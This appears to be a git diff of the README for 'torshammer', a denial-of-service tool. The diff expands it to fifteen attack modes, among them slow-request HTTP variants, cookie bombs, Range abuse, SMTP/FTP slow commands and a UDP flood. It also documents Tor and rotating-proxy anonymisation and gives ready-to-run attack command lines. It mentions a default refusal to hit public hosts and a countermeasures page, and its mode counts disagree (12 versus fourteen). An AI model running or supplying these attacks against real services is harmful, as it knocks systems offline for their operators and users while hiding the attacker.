@@ -37,13 +37,17 @@ What changed vs. the 2011 `legacy/` code:
 | Broken thread shutdown (`join()` list bug) | `asyncio.Event` stop flag + SIGINT/SIGTERM cleanup |
 | Bundled SocksiPy (broken SOCKS5 auth) | Built-in async SOCKS5/SOCKS4a/HTTP CONNECT |
 | Single Tor endpoint | Proxy list + rotation |
-| No coverage of modern mitigations | 4 vectors (slow-post, slow-headers, slow-read, chunked) |
+| No coverage of modern mitigations | 15 vectors (7 classic TCP + UDP + 7 protocol-specific) |
 | No stats, no duration control | Live stats line, JSON output, `--duration` |
 
 ## Features
 
 - **Zero runtime dependencies** - Python 3.11+ standard library only
-- **Four attack modes** - slow-post, slow-headers, slow-read, chunked
+- **Fifteen attack modes** - 7 classic TCP slow-request modes (`slow-post`, `slow-post-headers`,
+  `slow-headers`, `slow-read`, `chunked`, `multipart-slow-upload`, `expect-continue-abuse`), a real
+  `udp` flood, and 7 protocol-specific modes (`websocket-slow-upgrade`, `http-pipelining`,
+  `range-abuse`, `cookie-bomb`, `jsonrpc-slow`, `smtp-slow-envelope`, `ftp-slow-command`)
+- **Two interchangeable backends** - identical mode set in the Python and Rust engines
 - **Asyncio-powered** - Tens of thousands of concurrent connections
 - **HTTPS/TLS support** - With SNI (Server Name Indication)
 - **Proxy support** - SOCKS5, SOCKS4a, HTTP CONNECT (including Tor)
@@ -128,7 +132,24 @@ torshammer -u https://login.example.net/api -m slow-headers -c 512 --ssl-no-veri
 torshammer -u http://10.0.0.5 --tor               # anonymize via Tor (127.0.0.1:9050)
 torshammer -u http://example.com --proxy-list proxies.txt --rotate-proxies
 torshammer -u http://example.com -m slow-read -d 300 --json > stats.log
+torshammer -u http://example.com/wp-admin/media-new.php -m multipart-slow-upload -c 128 -d 60
+torshammer -u http://example.com -m expect-continue-abuse -c 128 -d 60
 ```
+
+Protocol-specific modes target the service that speaks the matching protocol:
+
+```bash
+torshammer -u http://example.com -m websocket-slow-upgrade   # incomplete WS handshakes
+torshammer -u http://example.com -m http-pipelining          # 50 pipelined requests/conn
+torshammer -u http://example.com/big.bin -m range-abuse      # 100 Range requests/conn
+torshammer -u http://example.com -m cookie-bomb              # ~10 KB cookie per request
+torshammer -u http://example.com/rpc -m jsonrpc-slow         # dribbled JSON-RPC payload
+torshammer -u http://mail.example.com:25 -m smtp-slow-envelope
+torshammer -u http://ftp.example.com:21 -m ftp-slow-command
+torshammer -u udp://dns.example.com:53 -m udp                # real UDP datagram flood
+```
+
+See [Attack Modes](docs/attack-modes.md) for the mechanism and countermeasures of each mode.
 
 The original flags still work: `-t <host> -r <threads> -p <port> -T`.
 
@@ -138,12 +159,12 @@ By default the tool refuses to target public internet hosts unless the operator 
 
 | Flag | Meaning | Default |
 |---|---|---|
-| `-u, --url` | Target URL (`http://` or `https://`) | required |
+| `-u, --url` | Target URL (`http://`, `https://` or `udp://`) | required |
 | `-c, --concurrency` | Concurrent sockets | 256 |
-| `-m, --mode` | `slow-post` \| `slow-headers` \| `slow-read` \| `chunked` | `slow-post` |
+| `-m, --mode` | `slow-post` \| `slow-post-headers` \| `slow-headers` \| `slow-read` \| `chunked` \| `multipart-slow-upload` \| `expect-continue-abuse` \| `websocket-slow-upgrade` \| `http-pipelining` \| `range-abuse` \| `cookie-bomb` \| `jsonrpc-slow` \| `smtp-slow-envelope` \| `ftp-slow-command` \| `udp` | `slow-post` |
 | `-dl / -dh` | Min/max dribble delay (s) | 0.1 / 3.0 |
 | `-d, --duration` | Auto-stop after N s (0 = until Ctrl-C) | 0 |
-| `--post-length` | Baseline `Content-Length` for post modes | 4096 |
+| `--post-length` | Baseline `Content-Length` for slow-post/slow-post-headers/chunked (byte budget for `udp`) | 4096 |
 | `--tor` | Proxy through `127.0.0.1:9050` | off |
 | `--proxy` / `--proxy-list` | Single proxy URL / file of proxy URLs | none |
 | `--rotate-proxies` | Random proxy per connection | off |
@@ -209,7 +230,7 @@ Emits one newline-delimited JSON object per interval:
        ▼                                 ▼
 ┌─────────────┐                   ┌─────────────┐
 │   Profiles  │                   │  ProxyPool  │
-│ (4 modes)   │                   │ (rotation)  │
+│ (12 modes)  │                   │ (rotation)  │
 └──────┬──────┘                   └──────┬──────┘
        │                                 │
        ▼                                 ▼
@@ -224,13 +245,16 @@ Emits one newline-delimited JSON object per interval:
 │   Target    │
 │ (HTTP/HTTPS)│
 └─────────────┘
+
+(UDP mode sends datagrams directly through `udp.py` instead of the Connection Factory.)
 ```
 
 **Modules:**
 - `cli.py` - Argument parsing, orchestration, signal handling
 - `config.py` - Configuration dataclass with validation
 - `engine.py` - Async attack engine with worker pool
-- `profiles.py` - Four attack profiles (slow-post, slow-headers, slow-read, chunked)
+- `profiles.py` - Fourteen TCP attack profiles (7 classic slow modes + 7 protocol-specific modes)
+- `udp.py` - UDP datagram flood mode
 - `conn.py` - Connection factory (plain, TLS, SOCKS5, SOCKS4a, HTTP CONNECT)
 - `proxies.py` - Proxy parsing and rotation
 - `useragents.py` - User-Agent list and file loader
